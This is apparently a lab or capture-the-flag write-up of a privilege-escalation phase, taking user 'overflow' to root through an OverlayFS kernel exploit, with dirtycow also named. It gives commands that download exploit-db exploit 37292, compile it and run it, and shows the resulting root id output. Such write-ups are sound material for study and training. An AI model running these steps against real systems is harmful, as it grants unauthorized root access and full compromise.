# Phase 3: Privilege Escalation

DetailedDocumentation of the privilege escalation from user `overflow` to root via OverlayFS exploitation.

## Contents

1. **System Enumeration** - Kernel version and vulnerability identification
2. **Exploit Selection** - OverlayFS privilege escalation
3. **Exploit Preparation** - Download, compilation, and setup
4. **Exploitation** - Successful execution and root access

## Identified Vulnerabilities

- dirtycow (CVE-2016-5195) - Suggested but not used
- OverlayFS kernel vulnerability - **Selected for exploitation**

## Exploit Process

```bash
wget https://www.exploit-db.com/download/37292
mv 37292 37292.c
gcc 37292.c -o exploit
./exploit
```

## Result

- ✅ Privilege escalation successful
- ✅ Root shell access obtained
- ✅ System fully compromised

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```
